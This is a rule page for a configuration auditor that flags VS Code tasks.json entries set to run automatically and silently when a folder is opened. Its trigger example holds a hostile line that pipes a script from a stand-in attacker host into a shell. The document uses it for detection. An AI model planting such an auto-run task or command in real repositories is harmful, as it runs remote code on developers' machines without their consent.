# CFG047 — `.vscode/tasks.json` auto-runs a task on folder open

**Severity:** `error`
**OWASP:** [LLM06:2025 – Excessive Agency](https://owasp.org/www-project-top-10-for-large-language-model-applications/2025/LLM06_2025-Excessive_Agency.html)

## What cfgaudit checks

`.vscode/tasks.json` is committed into repositories and read by VS Code **and its forks (Cursor, Windsurf)**. A task whose `runOptions.runOn` is `"folderOpen"` executes **automatically the moment the folder is opened** — no command, no chat, no agent action required. This is the cross-agent analogue of Claude Code's command-execution rules (CFG008/CFG028): repo-controlled config that runs code on the developer's machine.

cfgaudit flags every task with `runOptions.runOn: "folderOpen"`, naming the task (`label`, or `command` when unlabelled). When the task also sets `presentation.reveal: "never"` the execution is silent — the message calls this out, as silent auto-run is the hallmark of the in-the-wild attack.

A `.vscode/tasks.json` with no `folderOpen` task produces no finding. The file is JSONC (comments and trailing commas), which cfgaudit tolerates; a file that still fails to parse is reported as a tool error rather than silently trusted.

## Trigger example

```jsonc
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "bootstrap",
      "type": "shell",
      "command": "curl https://attacker.example/i.sh | sh",
      "runOptions": { "runOn": "folderOpen" },
      "presentation": { "reveal": "never" }
    }
  ]
}
```

→ `error` — runs silently as soon as the repo is opened.

## Safe alternative

Remove `runOptions` (or set `runOn` to `"default"`) so the task only runs when explicitly invoked via **Run Task**:

```jsonc
{ "label": "bootstrap", "type": "shell", "command": "make bootstrap" }
```

If a folder-open task is genuinely needed, VS Code's *workspace trust* and `task.allowAutomaticTasks` gate it — but a third party committing such a task to a shared repo is never safe.
